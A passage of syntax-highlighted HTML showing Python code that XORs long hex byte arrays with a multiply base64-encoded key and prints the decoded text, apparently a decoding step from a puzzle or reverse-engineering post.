class="number">0x75</span>, <span class="number">0x19</span>, <span class="number">0x29</span>, <span class="number">0x3F</span>, <span class="number">0x26</span>, <span class="number">0x02</span>, <span class="number">0x37</span>, <span class="number">0x25</span>, <span class="number">0x39</span>, <span class="number">0x31</span>, <span class="number">0x1F</span>, <span class="number">0x68</span>, <span class="number">0x78</span>, <span class="number">0x4A</span>, <span class="number">0x78</span>, <span class="number">0x7F</span>, <span class="number">0x7F</span>, <span class="number">0x18</span>, <span class="number">0x5C</span>, <span class="number">0x55</span>, <span class="number">0x74</span>, <span class="number">0x4C</span>, <span class="number">0x6E</span>, <span class="number">0x49</span>, <span class="number">0x72</span>, <span class="number">0x11</span>, <span class="number">0x6A</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0x58</span>, <span class="number">0x77</span>, <span class="number">0x76</span>, <span class="number">0x4B</span>, <span class="number">0x11</span>, <span class="number">0x72</span>, <span class="number">0x70</span>, <span class="number">0x74</span>, <span class="number">0x10</span>, <span class="number">0x46</span>, <span class="number">0x76</span>, <span class="number">0x67</span>, <span class="number">0x10</span>, <span class="number">0x58</span>, <span class="number">0x44</span>, <span class="number">0x11</span>, <span class="number">0x6E</span>, <span class="number">0x54</span>, <span class="number">0x75</span>, <span class="number">0x78</span>, <span class="number">0x4C</span>, <span class="number">0x77</span>, <span class="number">0x41</span>, <span class="number">0x11</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x76</span>, <span class="number">0x4C</span>, <span class="number">0x44</span>, <span class="number">0x4F</span>, <span class="number">0x76</span>, <span class="number">0x66</span>, <span class="number">0x4C</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x4C</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x76</span>, <span class="number">0x51</span>, <span class="number">0x7A</span>, <span class="number">0x1F</span>, <span class="number">0x37</span>, <span class="number">0x5E</span>, <span class="number">0x42</span>, <span class="number">0x22</span>, <span class="number">0x6D</span>, <span class="number">0x4B</span>, <span class="number">0x3B</span>, <span class="number">0x78</span>, <span class="number">0x45</span>, <span class="number">0x64</span>, <span class="number">0x62</span>, <span class="number">0x41</span>, <span class="number">0x72</span>, <span class="number">0x76</span>, <span class="number">0x79</span>, <span class="number">0x57</span>, <span class="number">0x79</span>, <span class="number">0x77</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x44</span>, <span class="number">0x76</span>, <span class="number">0x66</span>, <span class="number">0x53</span>, <span class="number">0x41</span>, <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, <span class="number">0x77</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x51</span>, <span class="number">0x24</span>, <span class="number">0x08</span>, <span class="number">0x19</span>, <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0x11</span>, <span class="number">0x43</span>, <span class="number">0x58</span>, <span class="number">0x74</span>, <span class="number">0x4E</span>, <span class="number">0x6E</span>, <span class="number">0x78</span>, <span class="number">0x42</span>, <span class="number">0x66</span>, <span class="number">0x50</span>, <span class="number">0x78</span>, <span class="number">0x7A</span>, <span class="number">0x77</span>, <span class="number">0x54</span>, <span class="number">0x66</span>, <span class="number">0x45</span>, <span class="number">0x66</span>, <span class="number">0x7A</span>, <span class="number">0x53</span>, <span class="number">0x75</span>, <span class="number">0x4B</span>, <span class="number">0x44</span>, <span class="number">0x29</span>, <span class="number">0x47</span>, <span class="number">0x4B</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0x76</span>, <span class="number">0x67</span>, <span class="number">0x54</span>, <span class="number">0x41</span>, <span class="number">0x79</span>, <span class="number">0x76</span>, <span class="number">0x6A</span>, <span class="number">0x54</span>, <span class="number">0x75</span>, <span class="number">0x4B</span>, <span class="number">0x19</span>, <span class="number">0x7A</span>, <span class="number">0x42</span>, <span class="number">0x25</span>, <span class="number">0x58</span>, <span class="number">0x6C</span>, <span class="number">0x7A</span>, <span class="number">0x76</span>, <span class="number">0x7A</span>, <span class="number">0x41</span>, <span class="number">0x43</span>, <span class="number">0x4C</span>, <span class="number">0x44</span>, <span class="number">0x54</span>, <span class="number">0x44</span>, <span class="number">0x66</span>, <span class="number">0x6E</span>, <span class="number">0x6E</span>, <span class="number">0x76</span>, <span class="number">0x4E</span>, <span class="number">0x62</span>, <span class="number">0x2F</span>, <span class="number">0x33</span>, <span class="number">0x1F</span>, <span class="number">0x54</span>, <span class="number">0x58</span>, <span class="number">0x31</span>, <span class="number">0x45</span>, <span class="number">0x75</span>, <span class="number">0x44</span>, <span class="number">0x73</span>, <span class="number">0x04</span>, <span class="number">0x0F</span>, <span class="number">0x78</span>, <span class="number">0x5D</span>, <span class="number">0x66</span>, <span class="number">0x7B</span>, <span class="number">0x76</span>, <span class="number">0x6C</span>, <span class="number">0x4E</span>, <span class="number">0x5D</span>, <span class="number">0x66</span>, <span class="number">0x6E</span>, <span class="number">0x4C</span>, <span class="number">0x72</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x4D</span>, <span class="number">0x54</span>, <span class="number">0x4A</span>, <span class="number">0x42</span>, <span class="number">0x67</span>, <span class="number">0x72</span>, <span class="number">0x5A</span>, <span class="number">0x77</span>, <span class="number">0x4B</span>, <span class="number">0x75</span>, <span class="number">0x15</span>, <span class="number">0x75</span>, <span class="number">0x10</span>, <span class="number">0x43</span>, <span class="number">0x2C</span>, <span class="number">0x25</span>, <span class="number">0x2D</span>, <span class="number">0x16</span>, <span class="number">0x39</span>, <span class="number">0x5A</span>, <span class="number">0x38</span>, <span class="number">0x71</span>, <span class="number">0x57</span>, <span class="number">0x76</span>, <span class="number">0x4A</span>, <span class="number">0x66</span>, <span class="number">0x41</span>, <span class="number">0x77</span>, <span class="number">0x66</span>, <span class="number">0x6E</span>, <span class="number">0x52</span>, <span class="number">0x42</span>, <span class="number">0x66</span>, <span class="number">0x37</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0x12</span>, <span class="number">0x48</span>, <span class="number">0x77</span>, <span class="number">0x76</span>, <span class="number">0x4D</span>, <span class="number">0x15</span>, <span class="number">0x57</span>, <span class="number">0x76</span>, <span class="number">0x12</span>, <span class="number">0x6E</span>, <span class="number">0x53</span>, <span class="number">0x75</span>, <span class="number">0x0F</span>, <span class="number">0x37</span>, <span class="number">0x20</span>, <span class="number">0x07</span>, <span class="number">0x66</span>, <span class="number">0x41</span>, <span class="number">0x4B</span>, <span class="number">0x6F</span>, <span class="number">0x67</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x6D</span>, <span class="number">0x66</span>, <span class="number">0x71</span>, <span class="number">0x58</span>, <span class="number">0x7A</span>, <span class="number">0x67</span>, <span class="number">0x19</span>, <span class="number">0x75</span>, <span class="number">0x42</span>, <span class="number">0x75</span>, <span class="number">0x2D</span>, <span class="number">0x3F</span>, <span class="number">0x7A</span>, <span class="number">0x68</span>, <span class="number">0x50</span>, <span class="number">0x63</span>, <span class="number">0x77</span>, <span class="number">0x66</span>, <span class="number">0x79</span>, <span class="number">0x5A</span>, <span class="number">0x75</span>, <span class="number">0x4D</span>, <span class="number">0x48</span>, <span class="number">0x7A</span>, <span class="number">0x45</span>, <span class="number">0x4B</span>, <span class="number">0x7A</span>, <span class="number">0x48</span>, <span class="number">0x30</span>, <span class="number">0x14</span>, <span class="number">0x32</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x76</span>, <span class="number">0x59</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x32</span>, <span class="number">0x2F</span>, <span class="number">0x3B</span>, <span class="number">0x39</span>, <span class="number">0x34</span>, <span class="number">0x14</span>, <span class="number">0x38</span>, <span class="number">0x22</span>, <span class="number">0x50</span>, <span class="number">0x01</span>, <span class="number">0x46</span>, <span class="number">0x60</span>, <span class="number">0x34</span>, <span class="number">0x21</span>, <span class="number">0x24</span>, <span class="number">0x6E</span>, <span class="number">0x64</span>, <span class="number">0x6E</span>, <span class="number">0x76</span>, <span class="number">0x42</span>, <span class="number">0x67</span>, <span class="number">0x48</span>, <span class="number">0x53</span>, <span class="number">0x75</span>, <span class="number">0x10</span>, <span class="number">0x44</span>, <span class="number">0x73</span>, <span class="number">0x76</span>, <span class="number">0x76</span>, <span class="number">0x7A</span>, <span class="number">0x51</span>, <span class="number">0x71</span>, <span class="number">0x4E</span>, <span class="number">0x0D</span>, <span class="number">0x35</span>, <span class="number">0x6D</span>, <span class="number">0x7E</span>, <span class="number">0x13</span>, <span class="number">0x69</span>, <span class="number">0x69</span>, <span class="number">0x6B</span>, <span class="number">0x43</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x66</span>, <span class="number">0x33</span>, <span class="number">0x03</span>, <span class="number">0x43</span>, <span class="number">0x7B</span>, <span class="number">0x4C</span>, <span class="number">0x14</span>, <span class="number">0x3A</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x64</span>, <span class="number">0x37</span>, <span class="number">0x18</span>, <span class="number">0x2D</span>, <span class="number">0x62</span>, <span class="number">0x6D</span>, <span class="number">0x5C</span>, <span class="number">0x66</span>, <span class="number">0x79</span>, <span class="number">0x41</span>, <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x76</span>, <span class="number">0x50</span>, <span class="number">0x16</span>, <span class="number">0x76</span>, <span class="number">0x4D</span>, <span class="number">0x50</span>, <span class="number">0x67</span>, <span class="number">0x73</span>, <span class="number">0x11</span>, <span class="number">0x06</span>, <span class="number">0x25</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x0F</span>, <span class="number">0x6D</span>, <span class="number">0x68</span>, <span class="number">0x77</span>, <span class="number">0x58</span>, <span class="number">0x50</span>, <span class="number">0x76</span>, <span class="number">0x4D</span>, <span class="number">0x54</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x4C</span>, <span class="number">0x7A</span>, <span class="number">0x53</span>, <span class="number">0x7A</span>, <span class="number">0x39</span>, <span class="number">0x58</span>, <span class="number">0x5D</span>, <span class="number">0x41</span>, <span class="number">0x5A</span>, <span class="number">0x66</span>, <span class="number">0x78</span>, <span class="number">0x75</span>, <span class="number">0x12</span>, <span class="number">0x54</span>, <span class="number">0x4B</span>, <span class="number">0x41</span>, <span class="number">0x76</span>, <span class="number">0x6A</span>, <span class="number">0x54</span>, <span class="number">0x31</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x3B</span>, <span class="number">0x17</span>, <span class="number">0x38</span>, <span class="number">0x32</span>, <span class="number">0x6E</span>, <span class="number">0x5C</span>, <span class="number">0x10</span>, <span class="number">0x7A</span>, <span class="number">0x77</span>, <span class="number">0x44</span>, <span class="number">0x67</span>, <span class="number">0x72</span>, <span class="number">0x68</span>, <span class="number">0x72</span>, <span class="number">0x4B</span>, <span class="number">0x15</span>, <span class="number">0x77</span>, <span class="number">0x42</span>, <span class="number">0x78</span>, <span class="number">0x71</span>, <span class="number">0x5A</span>, <span class="number">0x76</span>, <span class="number">0x44</span>, <span class="number">0x11</span>, <span class="number">0x1D</span>, <span class="number">0x30</span>, <span class="number">0x5B</span>, <span class="number">0x25</span>, <span class="number">0x23</span>, <span class="number">0x73</span>, <span class="number">0x53</span>, <span class="number">0x6E</span>, <span class="number">0x5F</span>, <span class="number">0x62</span>, <span class="number">0x5D</span>, <span class="number">0x69</span>, <span class="number">0x6B</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x44</span>, <span class="number">0x4F</span>, <span class="number">0x6D</span>, <span class="number">0x11</span>, <span class="number">0x7A</span>, <span class="number">0x51</span>, <span class="number">0x71</span>, <span class="number">0x78</span>, <span class="number">0x48</span>, <span class="number">0x77</span>, <span class="number">0x6D</span>, <span class="number">0x4B</span>, <span class="number">0x15</span>, <span class="number">0x6A</span>, <span class="number">0x24</span>, <span class="number">0x57</span>, <span class="number">0x0C</span>, <span class="number">0x1E</span>, <span class="number">0x27</span>, <span class="number">0x5F</span>, <span class="number">0x71</span>, <span class="number">0x5C</span>, <span class="number">0x76</span>, <span class="number">0x4A</span>, <span class="number">0x72</span>, <span class="number">0x77</span>, <span class="number">0x42</span>, <span class="number">0x78</span>, <span class="number">0x62</span>, <span class="number">0x68</span>, <span class="number">0x28</span>, <span class="number">0x60</span>, <span class="number">0x40</span>, <span class="number">0x6F</span>, <span class="number">0x76</span>, <span class="number">0x11</span>, <span class="number">0x76</span>, <span class="number">0x55</span>, <span class="number">0x74</span>, <span class="number">0x4C</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x1A</span>, <span class="number">0x77</span>, <span class="number">0x67</span>, <span class="number">0x6D</span>, <span class="number">0x5D</span>, <span class="number">0x58</span>, <span class="number">0x77</span>, <span class="number">0x76</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0x70</span>, <span class="number">0x74</span>, <span class="number">0x10</span>, <span class="number">0x1D</span>, <span class="number">0x20</span>, <span class="number">0x08</span>, <span class="number">0x42</span>, <span class="number">0x1C</span>, <span class="number">0x0D</span>, <span class="number">0x52</span>, <span class="number">0x3A</span>, <span class="number">0x54</span>, <span class="number">0x68</span>, <span class="number">0x78</span>, <span class="number">0x59</span>, <span class="number">0x67</span>, <span class="number">0x50</span>, <span class="number">0x0A</span>, <span class="number">0x7A</span>, <span class="number">0x2D</span>, <span class="number">0x5C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">s[<span class="number">0</span>] ^= <span class="number">0x56</span></span><br><span class="line">xor = <span class="string">b&quot;Vm0xd1NtUXlWa1pPVldoVFlUSlNjVlZyV21GVk1XeDBaRVYwYWxadVFsaFdiWFF3VmxkS1IxTnNXbFpXZWtFeFZsUkdTMk15VGtaYVJtUk9ZbXRLZVZacldtdFNNVnBYVm01R1UySkdXbFJVVnpWUFRURmtjbGRzWkU5U01IQXdWa2QwVjFaWFNrbFJiR2hWVm5wV2NsUlVSbFpsUmxwMFQxZG9UbUV5ZHpCWFYzUmhZekZhYzFacVdtbFNXRkpYV1ZkMGQyUnNVbGhsU0dSVVZqQndSMVpITVc5aFZscFlaSHBLVjJKVVFYaFdSRVp6VmpGS1dWcEdVbWxpVmtwdlZsZDRWazFXU2tkaVJtUllZbTFTV0ZWdGRHRk5WbXQzV2toT2FWSnNjRmRaTUdoM1ZqQXhWMk5JV2xkU1JVVjRWbXBHUjJOV1VuTlNiR1JUVWxWVk1RPT0=&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">2318</span>):</span><br><span class="line">    s[i] ^= xor[i%<span class="number">460</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, s)))</span><br><span class="line"></span><br><span class="line">s = [<span class="number">0x75</span>, <span class="number">0x1B</span>, <span class="number">0x55</span>, <span class="number">0x0A</span>, <span class="number">0x17</span>, <span class="number">0x58</span>, <span class="number">0x21</span>, <span class="number">0x1A</span>, <span class="number">0x75</span>, <span class="number">0x6B</span>, <span class="number">0x5F</span>, <span class="number">0x67</span>, <span class="number">0x6B</span>, <span class="number">0x3B</span>, <span class="number">0x53</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x33</span>, <span class="number">0x66</span>, <span class="number">0x3F</span>, <span class="number">0x7D</span>, <span class="number">0x32</span>, <span class="number">0x40</span>, <span class="number">0x2C</span>, <span class="number">0x46</span>, <span class="number">0x22</span>, <span class="number">0x45</span>, <span class="number">0x7A</span>, <span class="number">0x0A</span>, <span class="number">0x3B</span>, <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0x33</span>, <span class="number">0x3E</span>, <span class="number">0x18</span>, <span class="number">0x45</span>, <span class="number">0x3D</span>, <span class="number">0x15</span>, <span class="number">0x6C</span>, <span class="number">0x23</span>, <span class="number">0x4D</span>, <span class="number">0x30</span>, <span class="number">0x7A</span>, <span class="number">0x2D</span>, <span class="number">0x5E</span>, <span class="number">0x53</span>, <span class="number">0x5D</span>, <span class="number">0x0D</span>, <span class="number">0x0F</span>, <span class="number">0x0D</span>, <span class="number">0x30</span>, <span class="number">0x29</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x66</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x38</span>, <span class="number">0x27</span>, <span class="number">0x32</span>, <span class="number">0x13</span>, <span class="number">0x22</span>, <span class="number">0x04</span>, <span class="number">0x15</span>, <span class="number">0x0E</span>, <span class="number">0x68</span>, <span class="number">0x3B</span>, <span class="number">0x43</span>, <span class="number">0x17</span>, <span class="number">0x21</span>, <span class="number">0x1A</span>, <span class="number">0x6E</span>, <span class="number">0x2E</span>, <span class="number">0x07</span>, <span class="number">0x25</span>, <span class="number">0x44</span>, <span class="number">0x78</span>, <span class="number">0x3C</span>, <span class="number">0x25</span>, <span class="number">0x15</span>, <span class="number">0x21</span>, <span class="number">0x26</span>, <span class="number">0x29</span>, <span class="number">0x36</span>, <span class="number">0x1C</span>, <span class="number">0x27</span>, <span class="number">0x50</span>, <span class="number">0x6E</span>, <span class="number">0x5E</span>, <span class="number">0x20</span>, <span class="number">0x0A</span>, <span class="number">0x45</span>, <span class="number">0x07</span>, <span class="number">0x76</span>, <span class="number">0x15</span>, <span class="number">0x1B</span>, <span class="number">0x15</span>, <span class="number">0x71</span>, <span class="number">0x30</span>, <span class="number">0x26</span>, <span class="number">0x1B</span>, <span class="number">0x34</span>, <span class="number">0x1F</span>, <span class="number">0x19</span>, <span class="number">0x3B</span>, <span class="number">0x4B</span>, <span class="number">0x78</span>, <span class="number">0x29</span>, <span class="number">0x46</span>, <span class="number">0x7A</span>, <span class="number">0x76</span>, <span class="number">0x7A</span>, <span class="number">0x41</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x15</span>, <span class="number">0x10</span>, <span class="number">0x66</span>, <span class="number">0x3D</span>, <span class="number">0x6E</span>, <span class="number">0x6B</span>, <span class="number">0x4E</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0x38</span>, <span class="number">0x45</span>, <span class="number">0x51</span>, <span class="number">0x18</span>, <span class="number">0x69</span>, <span class="number">0x3B</span>, <span class="number">0x75</span>, <span class="number">0x59</span>, <span class="number">0x73</span>, <span class="number">0x4B</span>, <span class="number">0x02</span>, <span class="number">0x34</span>, <span class="number">0x0D</span>, <span class="number">0x27</span>, <span class="number">0x3E</span>, <span class="number">0x76</span>, <span class="number">0x35</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x77</span>, <span class="number">0x36</span>, <span class="number">0x29</span>, <span class="number">0x21</span>, <span class="number">0x7D</span>, <span class="number">0x33</span>, <span class="number">0x44</span>, <span class="number">0x4F</span>, <span class="number">0x60</span>, <span class="number">0x42</span>, <span class="number">0x67</span>, <span class="number">0x72</span>, <span class="number">0x5A</span>, <span class="number">0x25</span>, <span class="number">0x0E</span>, <span class="number">0x21</span>, <span class="number">0x40</span>, <span class="number">0x27</span>, <span class="number">0x5E</span>, <span class="number">0x11</span>, <span class="number">0x24</span>, <span class="number">0x30</span>, <span class="number">0x2C</span>, <span class="number">0x56</span>, <span class="number">0x7F</span>, <span class="number">0x02</span>, <span class="number">0x1E</span>, <span class="number">0x71</span>, <span class="number">0x5A</span>, <span class="number">0x25</span>, <span class="number">0x46</span>, <span class="number">0x66</span>, <span class="number">0x12</span>, <span class="number">0x7B</span>, <span class="number">0x66</span>, <span class="number">0x2D</span>, <span class="number">0x5B</span>, <span class="number">0x59</span>, <span class="number">0x4C</span>, <span class="number">0x37</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0x44</span>, <span class="number">0x0D</span>, <span class="number">0x34</span>, <span class="number">0x64</span>, <span class="number">0x4D</span>, <span class="number">0x5D</span>, <span class="number">0x16</span>, <span class="number">0x25</span>, <span class="number">0x5A</span>, <span class="number">0x66</span>, <span class="number">0x05</span>, <span class="number">0x30</span>, <span class="number">0x0F</span>, <span class="number">0x64</span>, <span class="number">0x73</span>, <span class="number">0x12</span>, <span class="number">0x6F</span>, <span class="number">0x50</span>, <span class="number">0x08</span>, <span class="number">0x5F</span>, <span class="number">0x4D</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x6D</span>, <span class="number">0x36</span>, <span class="number">0x71</span>, <span class="number">0x45</span>, <span class="number">0x7A</span>, <span class="number">0x31</span>, <span class="number">0x5C</span>, <span class="number">0x36</span>, <span class="number">0x50</span>, <span class="number">0x7D</span>, <span class="number">0x32</span>, <span class="number">0x5A</span>, <span class="number">0x2E</span>, <span class="number">0x60</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x77</span>, <span class="number">0x30</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0x67</span>, <span class="number">0x45</span>, <span class="number">0x5A</span>, <span class="number">0x6B</span>, <span class="number">0x57</span>, <span class="number">0x5C</span>, <span class="number">0x74</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x5A</span>, <span class="number">0x7E</span>, <span class="number">0x50</span>, <span class="number">0x4D</span>, <span class="number">0x67</span>, <span class="number">0x53</span>, <span class="number">0x5D</span>, <span class="number">0x4B</span>, <span class="number">0x6A</span>, <span class="number">0x6E</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0x1F</span>, <span class="number">0x58</span>, <span class="number">0x29</span>, <span class="number">0x7A</span>, <span class="number">0x11</span>, <span class="number">0x2C</span>, <span class="number">0x0E</span>, <span class="number">0x2E</span>, <span class="number">0x75</span>, <span class="number">0x79</span>, <span class="number">0x48</span>, <span class="number">0x67</span>, <span class="number">0x58</span>, <span class="number">0x77</span>, <span class="number">0x78</span>, <span class="number">0x57</span>, <span class="number">0x6B</span>, <span class="number">0x48</span>, <span class="number">0x41</span>, <span class="number">0x6D</span>, <span class="number">0x03</span>, <span class="number">0x4A</span>, <span class="number">0x60</span>, <span class="number">0x61</span>, <span class="number">0x7F</span>, <span class="number">0x73</span>, <span class="number">0x58</span>, <span class="number">0x6A</span>, <span class="number">0x64</span>, <span class="number">0x44</span>, <span class="number">0x73</span>, <span class="number">0x6D</span>, <span class="number">0x76</span>, <span class="number">0x02</span>, <span class="number">0x2C</span>, <span class="number">0x20</span>, <span class="number">0x23</span>, <span class="number">0x11</span>, <span class="number">0x5B</span>, <span class="number">0x41</span>, <span class="number">0x20</span>, <span class="number">0x28</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x44</span>, <span class="number">0x12</span>, <span class="number">0x3A</span>, <span class="number">0x26</span>, <span class="number">0x6A</span>, <span class="number">0x3C</span>, <span class="number">0x7F</span>, <span class="number">0x4A</span>, <span class="number">0x60</span>, <span class="number">0x6B</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x71</span>, <span class="number">0x6C</span>, <span class="number">0x59</span>, <span class="number">0x68</span>, <span class="number">0x51</span>, <span class="number">0x67</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x59</span>, <span class="number">0x0D</span>, <span class="number">0x5C</span>, <span class="number">0x10</span>, <span class="number">0x7A</span>, <span class="number">0x4D</span>, <span class="number">0x35</span>, <span class="number">0x5D</span>, <span class="number">0x0B</span>, <span class="number">0x36</span>, <span class="number">0x17</span>, <span class="number">0x65</span>, <span class="number">0x0A</span>, <span class="number">0x39</span>, <span class="number">0x0B</span>, <span class="number">0x24</span>, <span class="number">0x1D</span>, <span class="number">0x58</span>, <span class="number">0x20</span>, <span class="number">0x08</span>, <span class="number">0x17</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x1C</span>, <span class="number">0x73</span>, <span class="number">0x53</span>, <span class="number">0x21</span>, <span class="number">0x4E</span>, <span class="number">0x72</span>, <span class="number">0x77</span>, <span class="number">0x41</span>, <span class="number">0x5A</span>, <span class="number">0x30</span>, <span class="number">0x3D</span>, <span class="number">0x36</span>, <span class="number">0x00</span>, <span class="number">0x54</span>, <span class="number">0x02</span>, <span class="number">0x41</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, <span class="number">0x12</span>, <span class="number">0x39</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x28</span>, <span class="number">0x4A</span>, <span class="number">0x24</span>, <span class="number">0x6F</span>, <span class="number">0x6F</span>, <span class="number">0x5C</span>, <span class="number">0x10</span>, <span class="number">0x7A</span>, <span class="number">0x77</span>, <span class="number">0x44</span>, <span class="number">0x31</span>, <span class="number">0x37</span>, <span class="number">0x2B</span>, <span class="number">0x60</span>, <span class="number">0x4B</span>, <span class="number">0x53</span>, <span class="number">0x77</span>, <span class="number">0x5F</span>, <span class="number">0x78</span>, <span class="number">0x37</span>, <span class="number">0x08</span>, <span class="number">0x37</span>, <span class="number">0x51</span>, <span class="number">0x00</span>, <span class="number">0x47</span>, <span class="number">0x24</span>, <span class="number">0x1B</span>, <span class="number">0x7D</span>, <span class="number">0x5D</span>, <span class="number">0x73</span>, <span class="number">0x4E</span>, <span class="number">0x6E</span>, <span class="number">0x4A</span>, <span class="number">0x24</span>, <span class="number">0x08</span>, <span class="number">0x31</span>, <span class="number">0x53</span>, <span class="number">0x74</span>, <span class="number">0x20</span>, <span class="number">0x44</span>, <span class="number">0x52</span>, <span class="number">0x6D</span>, <span class="number">0x57</span>, <span class="number">0x7A</span>, <span class="number">0x5B</span>, <span class="number">0x71</span>, <span class="number">0x3E</span>, <span class="number">0x48</span>, <span class="number">0x7D</span>, <span class="number">0x6D</span>, <span class="number">0x43</span>, <span class="number">0x06</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x12</span>, <span class="number">0x55</span>, <span class="number">0x4B</span>, <span class="number">0x67</span>, <span class="number">0x1F</span>, <span class="number">0x7A</span>, <span class="number">0x76</span>, <span class="number">0x7C</span>, <span class="number">0x4A</span>, <span class="number">0x34</span>, <span class="number">0x7E</span>, <span class="number">0x59</span>, <span class="number">0x52</span>, <span class="number">0x48</span>, <span class="number">0x68</span>, <span class="number">0x75</span>, <span class="number">0x4A</span>, <span class="number">0x6A</span>, <span class="number">0x3D</span>, <span class="number">0x33</span>, <span class="number">0x45</span>, <span class="number">0x23</span>, <span class="number">0x07</span>, <span class="number">0x3A</span>, <span class="number">0x4C</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x2A</span>, <span class="number">0x19</span>, <span class="number">0x40</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0x58</span>, <span class="number">0x77</span>, <span class="number">0x76</span>, <span class="number">0x4B</span>, <span class="number">0x11</span>, <span class="number">0x3F</span>, <span class="number">0x39</span>, <span class="number">0x2C</span>, <span class="number">0x18</span>, <span class="number">0x59</span>, <span class="number">0x39</span>, <span class="number">0x19</span>, <span class="number">0x18</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x1F</span>, <span class="number">0x7E</span>, <span class="number">0x54</span>, <span class="number">0x7E</span>, <span class="number">0x78</span>, <span class="number">0x5E</span>, <span class="number">0x79</span>, <span class="number">0x51</span>, <span class="number">0x11</span>, <span class="number">0x5A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x07</span>, <span class="number">0x7E</span>, <span class="number">0x2F</span>, <span class="number">0x4C</span>, <span class="number">0x7E</span>, <span class="number">0x73</span>, <span class="number">0x1A</span>, <span class="number">0x2B</span>, <span class="number">0x09</span>, <span class="number">0x64</span>, <span class="number">0x44</span>, <span class="number">0x6A</span>, <span class="number">0x57</span>, <span class="number">0x66</span>, <span class="number">0x1E</span>, <span class="number">0x11</span>, <span class="number">0x77</span>, <span class="number">0x78</span>, <span class="number">0x5B</span>, <span class="number">0x18</span>, <span class="number">0x71</span>, <span class="number">0x49</span>, <span class="number">0x64</span>, <span class="number">0x24</span>, <span class="number">0x41</span>, <span class="number">0x7F</span>, <span class="number">0x76</span>, <span class="number">0x2F</span>, <span class="number">0x12</span>, <span class="number">0x3A</span>, <span class="number">0x65</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x4A</span>, <span class="number">0x66</span>, <span class="number">0x6A</span>, <span class="number">0x53</span>, <span class="number">0x51</span>, <span class="number">0x68</span>, <span class="number">0x54</span>, <span class="number">0x40</span>, <span class="number">0x7E</span>, <span class="number">0x6A</span>, <span class="number">0x4C</span>, <span class="number">0x13</span>, <span class="number">0x76</span>, <span class="number">0x4D</span>, <span class="number">0x58</span>, <span class="number">0x4B</span>, <span class="number">0x73</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0x58</span>, <span class="number">0x74</span>, <span class="number">0x4E</span>, <span class="number">0x6E</span>, <span class="number">0x3C</span>, <span class="number">0x0D</span>, <span class="number">0x32</span>, <span class="number">0x58</span>, <span class="number">0x75</span>, <span class="number">0x6B</span>, <span class="number">0x79</span>, <span class="number">0x44</span>, <span class="number">0x66</span>, <span class="number">0x4E</span>, <span class="number">0x66</span>, <span class="number">0x68</span>, <span class="number">0x5D</span>, <span class="number">0x65</span>, <span class="number">0x4B</span>, <span class="number">0x4E</span>, <span class="number">0x74</span>, <span class="number">0x25</span>, <span 